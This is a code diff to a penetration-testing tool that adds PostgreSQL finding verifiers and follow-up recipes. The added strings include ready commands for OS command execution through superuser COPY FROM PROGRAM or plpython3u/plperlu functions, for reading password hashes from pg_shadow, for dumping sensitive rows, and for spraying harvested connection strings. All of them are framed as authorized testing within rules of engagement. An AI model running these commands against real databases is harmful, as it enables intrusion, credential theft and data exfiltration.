@@ -344,6 +344,47 @@ def _v_redis(host, port, vuln):
         "FP only if the server actually required auth (it would have returned -NOAUTH)."]
 
 
+def _v_postgres(host, port, vuln):
+    # recce spoke the v3 protocol itself - trust auth / a credentialed login / the
+    # superuser COPY-FROM-PROGRAM capability / the sampled sensitive rows are all
+    # directly observed -> CONFIRMED.
+    b = _blob(vuln)
+    if "copy from program" in b or "-> rce" in b or " rce " in b:
+        confirmed = "rce confirmed" in b
+        return CONFIRMED, [
+            "recce read the connected role's privileges: it is a superuser (or member of "
+            "pg_execute_server_program), so `COPY t FROM PROGRAM 'cmd'` executes OS "
+            "commands as the postgres service account (directly observed"
+            + ("; recce ran a benign `id` and it returned output - RCE CONFIRMED)."
+               if confirmed else ")."),
+            "psql '...' -c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; "
+            "TABLE r;\" (benign proof) then your ROE command; alt: CREATE FUNCTION "
+            "LANGUAGE plpython3u/plperlu if that extension is installed.",
+            "FP only if the role is NOT actually a superuser / lacks "
+            "pg_execute_server_program (recce would not have raised this)."]
+    if "sensitive data" in b or "pii" in b or "datamine" in b:
+        return CONFIRMED, [
+            "recce authenticated, read the schema, and sampled rows from columns whose "
+            "names denote secrets/PII - real data was returned (directly observed; the "
+            "finding shows redacted samples).",
+            "Pull the full rows within ROE: psql '...' -c 'SELECT * FROM "
+            "<schema>.<table> LIMIT 100'; spray any harvested connection strings.",
+            "FP only if the columns hold non-sensitive data despite their names."]
+    if "trust auth" in b:
+        return CONFIRMED, [
+            "recce completed a v3 startup for 'postgres' with NO password - the server "
+            "answered AuthenticationOk (trust in pg_hba.conf), i.e. full unauthenticated "
+            "database access (directly observed).",
+            "psql 'host=<ip> port=<port> user=postgres' then \\l ; \\du ; SELECT "
+            "usename,passwd FROM pg_shadow (recce already read these).",
+            "FP only if the login was actually rejected (recce would not have raised this)."]
+    return CONFIRMED, [
+        "recce logged in with a credential from the engagement and the server returned a "
+        "session - the account has real database access (directly observed).",
+        "psql 'host=<ip> port=<port> user=<u>' and enumerate / dump within ROE.",
+        "FP only if the credential no longer works."]
+
+
 def _v_elasticsearch(host, port, vuln):
     # recce GET /_cat/indices returned the index list with no credential -> CONFIRMED.
     b = _blob(vuln)
@@ -906,6 +947,30 @@ _RECIPES: list[dict] = [
                "SAVE file-write chain for RCE (recce already read it).",
      "fp": "The server actually enforced auth (-NOAUTH).",
      "fn": _v_redis},
+    {"id": "postgres-rce",
+     "match": r"postgresql.*(rce|copy from program)|copy \.\.\. from program",
+     "name": "PostgreSQL superuser -> COPY FROM PROGRAM RCE",
+     "pre": ["PostgreSQL (5432) reachable", "The role is a superuser / can COPY FROM PROGRAM"],
+     "finish": "psql '...' -c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; "
+               "TABLE r;\" (benign) then the ROE command; or a plpython3u/plperlu function.",
+     "fp": "The role is not a superuser and lacks pg_execute_server_program.",
+     "fn": _v_postgres},
+    {"id": "postgres-datamine",
+     "match": r"postgresql sensitive data|postgresql.*(pii|secrets|credentials)",
+     "name": "PostgreSQL sensitive data exposed",
+     "pre": ["PostgreSQL (5432) reachable", "Read access to databases with sensitive columns"],
+     "finish": "psql '...' -c 'SELECT * FROM <schema>.<table> LIMIT 100' to pull the full "
+               "rows; spray harvested connection strings (within ROE).",
+     "fp": "The flagged columns hold non-sensitive data despite their names.",
+     "fn": _v_postgres},
+    {"id": "postgres-access",
+     "match": r"postgresql trust authentication|postgresql credentialed access",
+     "name": "PostgreSQL unauthenticated / credentialed access",
+     "pre": ["PostgreSQL (5432) reachable", "trust auth or a working credential"],
+     "finish": "psql 'host=<ip> port=<port> user=<u>' then \\l ; \\du ; SELECT "
+               "usename,passwd FROM pg_shadow (recce already read these).",
+     "fp": "The login was actually rejected (recce would not have raised this).",
+     "fn": _v_postgres},
     {"id": "elasticsearch-unauth",
      "match": r"elasticsearch exposed without authentication|elasticsearch.*(no auth|unauth)|"
               r"elasticsearch end-of-life|elasticsearch.*legacy build",
